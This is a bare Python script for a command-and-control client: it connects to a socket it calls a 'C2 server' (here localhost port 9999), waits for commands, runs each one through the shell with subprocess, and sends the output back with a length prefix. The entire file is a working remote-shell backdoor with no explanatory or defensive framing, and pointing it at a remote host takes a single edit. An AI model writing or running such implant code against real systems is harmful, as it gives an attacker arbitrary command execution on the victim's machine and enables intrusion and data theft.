import socket
import subprocess

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return str(e.output)

def send_all(sock, data):
    data_length = str(len(data)).zfill(10)  # Prepends the length with zeros to ensure it is 10 chars long
    sock.send(data_length.encode() + data.encode())  # Sends length + data

def main():
    host = '127.0.0.1'
    port = 9999
    
    with socket.socket() as s:
        s.connect((host, port))
        print("Connected to C2 server at {}:{}".format(host, port))
        
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd:
                break
            
            print("Received command:", cmd)
            output = execute_command(cmd)
            print("Sending output:", output)
            send_all(s, output)

if __name__ == '__main__':
    main()
